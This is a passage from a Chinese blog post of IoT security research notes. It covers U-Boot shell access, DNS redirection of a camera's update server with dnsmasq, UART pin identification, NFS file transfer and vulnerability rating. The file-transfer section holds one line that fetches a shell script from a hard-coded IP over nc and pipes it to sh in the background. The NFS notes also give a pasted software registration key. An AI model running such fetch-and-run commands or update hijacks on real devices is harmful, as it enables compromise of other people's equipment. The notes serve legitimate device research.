+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 再次进入uboot，将bootargs复原</span></span><br><span class="line">U-Boot 2013.10.0-AK_V3.0.08 (Mar 05 2019 - 15:37:04)</span><br><span class="line">Hit any key to stop autoboot:  3</span><br><span class="line"> 0</span><br><span class="line"></span><br><span class="line">anyka<span class="variable">$printenv</span> bootargs</span><br><span class="line">                        bootargs=console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/bin/sh mem=64M memsize=64M</span><br><span class="line"></span><br><span class="line">anyka<span class="variable">$setenv</span> bootargs console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/sbin/init mem=64M memsize=64M</span><br><span class="line">anyka<span class="variable">$saveenv</span></span><br><span class="line"></span><br><span class="line">Saving Environment to SPI Flash...</span><br><span class="line">Env save <span class="keyword">done</span> OK</span><br><span class="line">anyka<span class="variable">$printenv</span> bootargs</span><br><span class="line">                        bootargs=console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/sbin/init mem=64M memsize=64M</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 实测reset无效</span></span><br><span class="line">anyka<span class="variable">$reset</span></span><br><span class="line">           resetting ...</span><br><span class="line">heartbeat = 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 再次启动，uboot可正常引导系统</span></span><br><span class="line"><span class="comment"># telnet连接</span></span><br><span class="line">lxl@192  ~  telnet 192.168.0.106 2323</span><br><span class="line">Trying 192.168.0.106...</span><br><span class="line">Connected to 192.168.0.106.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br></pre></td></tr></table></figure>
+<h2 id="change-dns"><a href="#change-dns" class="headerlink" title="change-dns"></a>change-dns</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 Ubuntu 桥接模式，有线，保证有网</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 lxl@ubuntu:/mnt/hgfs/3/dns$ sudo ./dnschange.sh</span></span><br><span class="line"><span class="comment"># ip是否正确</span></span><br><span class="line">the ip is: 192.168.0.104</span><br><span class="line">10.10.10.1, is right [Y/n]?</span><br><span class="line"><span class="comment"># dnsmasq安装失败</span></span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  dnsmasq</span><br><span class="line">0 upgraded, 1 newly installed, 0 to remove and 194 not upgraded.</span><br><span class="line">Need to get 16.2 kB of archives.</span><br><span class="line">E: Failed to fetch http://mirrors.aliyun.com/ubuntu/pool/universe/d/dnsmasq/dnsmasq_2.79-1ubuntu0.4_all.deb  Could not resolve <span class="string">'security.ubuntu.com'</span></span><br><span class="line">E: Unable to fetch some archives, maybe run apt-get update or try with --fix-missing?</span><br><span class="line"><span class="comment"># dnsmasp启动失败</span></span><br><span class="line">Failed to restart dnsmasq.service: Unit dnsmasq.service not found.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 sudo apt install dnsmasq</span></span><br><span class="line">安装后会自动启动</span><br><span class="line">启动失败，bad option at line 2 of /etc/dnsmasq.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4  subl /etc/dnsmasq.conf</span></span><br><span class="line">lxl@ubuntu:/mnt/hgfs/3/dns$ cat /etc/dnsmasq.conf</span><br><span class="line">address=/aaa.com/192.168.0.104</span><br><span class="line">10.10.10.1</span><br><span class="line">lxl@ubuntu:/mnt/hgfs/3/dns$ subl /etc/dnsmasq.conf</span><br><span class="line">lxl@ubuntu:/mnt/hgfs/3/dns$ cat /etc/dnsmasq.conf</span><br><span class="line">address=/aaa.com/192.168.0.104</span><br><span class="line">address=/ipcupdate.av380.net/192.168.0.104</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5 启动nginx、dnsmasq</span></span><br><span class="line">sudo service nginx status</span><br><span class="line">sudo service dnsmasq status</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6 win7测试，修改本机dns</span></span><br><span class="line"><span class="comment"># 修改前</span></span><br><span class="line">C:\Users\lxl&gt;ping aaa.com</span><br><span class="line">正在 Ping aaa.com [45.60.62.121] 具有 32 字节的数据:</span><br><span class="line">来自 45.60.62.121 的回复: 字节=32 时间=194ms TTL=51</span><br><span class="line">来自 45.60.62.121 的回复: 字节=32 时间=194ms TTL=51</span><br><span class="line">来自 45.60.62.121 的回复: 字节=32 时间=194ms TTL=51</span><br><span class="line">来自 45.60.62.121 的回复: 字节=32 时间=194ms TTL=51</span><br><span class="line"><span class="comment"># 修改后</span></span><br><span class="line">C:\Users\lxl&gt;ping aaa.com</span><br><span class="line">正在 Ping aaa.com [192.168.0.104] 具有 32 字节的数据:</span><br><span class="line">来自 192.168.0.104 的回复: 字节=32 时间&lt;1ms TTL=64</span><br><span class="line">来自 192.168.0.104 的回复: 字节=32 时间&lt;1ms TTL=64</span><br><span class="line">来自 192.168.0.104 的回复: 字节=32 时间&lt;1ms TTL=64</span><br><span class="line">来自 192.168.0.104 的回复: 字节=32 时间&lt;1ms TTL=64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7 测试dns，修改路由器dns</span></span><br><span class="line">原-router-ip、改-192.168.0.104（dnsmasq所在）</span><br></pre></td></tr></table></figure>
+<h2 id="硬件相关"><a href="#硬件相关" class="headerlink" title="硬件相关"></a>硬件相关</h2><h3 id="判断UART"><a href="#判断UART" class="headerlink" title="判断UART"></a>判断UART</h3><ul>
+<li><p>gnd</p>
+<ul>
+<li>指针类似wifi符号（蜂鸣器档）</li>
+<li>路由器不需通电</li>
+<li>黑色接地或金属板</li>
+<li>红色试，出声的那个</li>
+</ul>
+</li>
+<li><p>tx/rx/vcc</p>
+<ul>
+<li>指针20V（旋转方向无所谓）</li>
+<li>需通电</li>
+<li>黑色接gnd</li>
+<li>红色试，电源开启后，电压小的为rx，高的为vcc/tx，其中稳定的为vcc</li>
+</ul>
+</li>
+</ul>
+<h2 id="设备文件传输"><a href="#设备文件传输" class="headerlink" title="设备文件传输"></a>设备文件传输</h2><ul>
+<li>常规：wget/curl、tftp、scp</li>
+<li><p>mount+nfs</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mac</span></span><br><span class="line">- 参考：https://blog.csdn.net/weixin_44204717/article/details/86526639</span><br><span class="line">- mac服务端：sudo vim /etc/exports：/Users/lxl/Public/4share -alldirs -network 192.168.55.0 -mask 255.255.255.0（默认就是rw权限，如果只读，则-ro）、nfsd status/<span class="built_in">enable</span>/start</span><br><span class="line">- 摄像头客户端：mount -t nfs 192.168.55.153:/Users/lxl/Public/nfs_share /home -o nolock</span><br><span class="line">- 客户端向外传文件：touch: 111: Permission denied（没权限，cp命令也如此），直接把nfs服务端的目录权限设为777</span><br><span class="line"></span><br><span class="line"><span class="comment"># win</span></span><br><span class="line">- 参考：https://blog.csdn.net/paladinzh/article/details/96162270</span><br><span class="line">- 下载：haneWIN NFS Server <span class="keyword">for</span> Windows，https://www.hanewin.net/nfs-e.htm</span><br><span class="line">- 注册码：https://www.cnblogs.com/SoaringLee/p/10532523.html（astray.cn-FBLZ9467C95EEB4B）</span><br><span class="line">- 配置：D:\tool\nfsd\nfs_dir -public -name:nfs</span><br><span class="line">- 挂载：摄像头失败，但Ubuntu成功</span><br><span class="line">mount -t nfs -o nolock 192.168.0.100:/nfs /tmp</span><br><span class="line">mount: mounting 192.168.0.100:/nfs on /tmp failed: No such device</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>nc实现wget</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"sleep 120;cd /tmp;echo -n -e 'GET /03/a.sh HTTP/1.1\r\nHost: 149.28.59.105\r\n\r\n'|nc 149.28.59.105 80|sed '1,9d'|sh &amp;"</span> &gt;&gt; <span class="variable">$f</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="杂乱"><a href="#杂乱" class="headerlink" title="杂乱"></a>杂乱</h2><ul>
+<li>ghidra跑过脚本后，将处理后的程序导出，file-export program或快捷键O，选择类型为ELF，可以在IDA中打开。</li>
+<li>1</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file+zone+key+value</span></span><br><span class="line">result = IFCWriteStringOnce(<span class="string">"/mnt/mtd/mvconf/version.ini"</span>, <span class="string">"[app_version]"</span>, <span class="string">"name"</span>, name);</span><br><span class="line">result = IFCWriteStringOnce(<span class="string">"/mnt/mtd/mvconf/version.ini"</span>, <span class="string">"[app_version]"</span>, <span class="string">"date"</span>, date);</span><br><span class="line"></span><br><span class="line">/mnt/mtd/mvconf <span class="comment"># cat version.ini</span></span><br><span class="line">[app_version]</span><br><span class="line">name=AppV380E11_AKQ8_MS32006_V2.6.5.9</span><br><span class="line">date=20201229</span><br></pre></td></tr></table></figure>
+<h2 id="评判漏洞"><a href="#评判漏洞" class="headerlink" title="评判漏洞"></a>评判漏洞</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 攻击者</span></span><br><span class="line">lan（network-adjacent）</span><br><span class="line">wan（remote attackers）</span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line">是否需要认证</span><br><span class="line"><span class="comment"># 3 类型</span></span><br><span class="line">远程代码执行（溢出）</span><br><span class="line">命令注入（system）</span><br><span class="line">认证绕过</span><br><span class="line">信息泄漏</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>21Guns
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://21guns.top/2021/08/09/iot/iot安全实用技巧小结/" title="iot安全实用技巧">http://21guns.top/2021/08/09/iot/iot安全实用技巧小结/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/IOT安全/" rel="tag"># IOT安全</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/07/26/iot/某嵌入式设备固件分析/" rel="prev" title="某嵌入式设备固件分析">
+      <i class="fa fa-chevron-left"></i> 某嵌入式设备固件分析
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/08/19/iot/路由器中的CGI漏洞/" rel="next" title="路由器中的CGI漏洞">
+      路由器中的CGI漏洞 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#iot安全实用技巧"><span class="nav-number">1.</span> <span class="nav-text">iot安全实用技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#函数定义在哪个so文件中"><span class="nav-number">1.1.</span> <span class="nav-text">函数定义在哪个so文件中</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查看所有elf的符号"><span class="nav-number">1.2.</span> <span class="nav-text">查看所有elf的符号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#已编译的"><span class="nav-number">1.3.</span> <span class="nav-text">已编译的</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ida快捷键"><span class="nav-number">1.4.</span> <span class="nav-text">ida快捷键</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#符号名识别"><span class="nav-number">1.5.</span> <span class="nav-text">符号名识别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#寻找函数定义"><span class="nav-number">1.6.</span> <span class="nav-text">寻找函数定义</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#函数识别"><span class="nav-number">1.7.</span> <span class="nav-text">函数识别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#发现开源软件"><span class="nav-number">1.8.</span> <span class="nav-text">发现开源软件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#判定main"><span class="nav-number">1.9.</span> <span class="nav-text">判定main</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#固件获取"><span class="nav-number">1.10.</span> <span class="nav-text">固件获取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#uboot-getshell"><span class="nav-number">1.11.</span> <span class="nav-text">uboot-getshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#change-dns"><span class="nav-number">1.12.</span> <span class="nav-text">change-dns</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#硬件相关"><span class="nav-number">1.13.</span> <span class="nav-text">硬件相关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#判断UART"><span class="nav-number">1.13.1.</span> <span class="nav-text">判断UART</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#设备文件传输"><span class="nav-number">1.14.</span> <span class="nav-text">设备文件传输</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#杂乱"><span class="nav-number">1.15.</span> <span class="nav-text">杂乱</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#评判漏洞"><span class="nav-number">1.16.</span> <span class="nav-text">评判漏洞</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="21Guns" src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">21Guns</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">164</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">71</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="vx:lxllxllx1" title="Wechat → vx:lxllxllx1" rel="noopener" target="_blank"><i class="fab fa-weixin fa-fw"></i>Wechat</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://github.com/21Gun5" title="GitHub → https://github.com/21Gun5" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">21Guns</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.5" zindex="0" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
